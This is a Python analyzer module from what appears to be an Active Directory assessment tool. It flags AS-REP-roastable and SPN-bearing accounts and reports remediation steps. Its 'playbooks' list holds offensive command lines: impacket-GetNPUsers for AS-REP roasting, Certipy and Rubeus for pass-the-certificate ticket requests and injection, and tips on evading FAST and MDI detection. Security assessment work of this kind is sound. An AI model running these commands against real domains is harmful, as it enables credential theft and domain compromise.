#!/usr/bin/env python3
"""Kerberos Advanced Evasion and Exploitation Analyzer."""

from __future__ import annotations
from typing import Optional

from ..models import ObjectStore
from ..theme import Severity
from .base import BaseAnalyzer, Finding


class KerberosAdvancedAnalyzer(BaseAnalyzer):
    name = "kerberos_advanced"
    description = "Advanced Kerberos evasion strategies (AS-REP downgrade, PTC, FAST bypass)"

    def analyze(self, store: ObjectStore) -> Optional[Finding]:
        # We look for principals configured for AS-REP roasting, or old accounts to target RC4 downgrade
        data = []
        for user in store.iter_by_type("user"):
            if user.extras.get("dontreqpreauth"):
                data.append({
                    "name": user.name,
                    "type": "User",
                    "sid": user.sid,
                    "as_rep_roastable": True
                })

        if not data:
            # We still might want to add PTC and FAST notes if we have AD CS or general Kerberoasting
            has_spns = any(u.extras.get("serviceprincipalnames") for u in store.iter_by_type("user"))
            if has_spns:
                 data.append({"name": "Domain-Wide", "type": "Global", "sid": "N/A", "as_rep_roastable": False})

        if not data:
            return None

        return Finding(
            title="Advanced Kerberos Evasion Paths",
            summary="Identified opportunities for Pass-the-Certificate, FAST Bypass, and AS-REP RC4 Downgrade.",
            severity=Severity.HIGH,
            data=data,
            recommendation="Advanced Kerberos Evasion & Downgrade Playbooks",
            eli5="Advanced evasion techniques allow bypassing Modern Kerberos Armoring (FAST) or downgrading encryption algorithms to RC4 for easier offline cracking. Pass-the-Certificate (PTC) bypasses password resets entirely by authenticating via PKINIT.",
            remediation="Enforce AES256 encryption. Disable RC4 (0x17) completely across the domain. Enforce Kerberos Armoring (FAST). Monitor for Event 4769 RC4 downgrade attempts.",
            playbooks=[
                "# AS-REP Roasting Downgrade Automation (force RC4):\nimpacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -request-pac",
                "# Pass-the-Certificate (PTC) Automation (after ESC1-13):\n# 1. UnPAC-the-hash using Certipy:\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                "# 2. Request TGT using Rubeus with Certificate:\nRubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_PFX> /password:<PFX_PASS> /domain:<DOMAIN> /dc:<DC_HOST> /ptt",
                "# Kerberos Armoring (FAST) Bypass Notes:\n# MDI detects anomalous TGT requests. If FAST is enforced, standard impacket attacks may fail.\n# Use a compromised machine account to armor requests: Rubeus asktgt ... /enctype:AES256 /targetdomain:<DOMAIN>"
            ]
        )
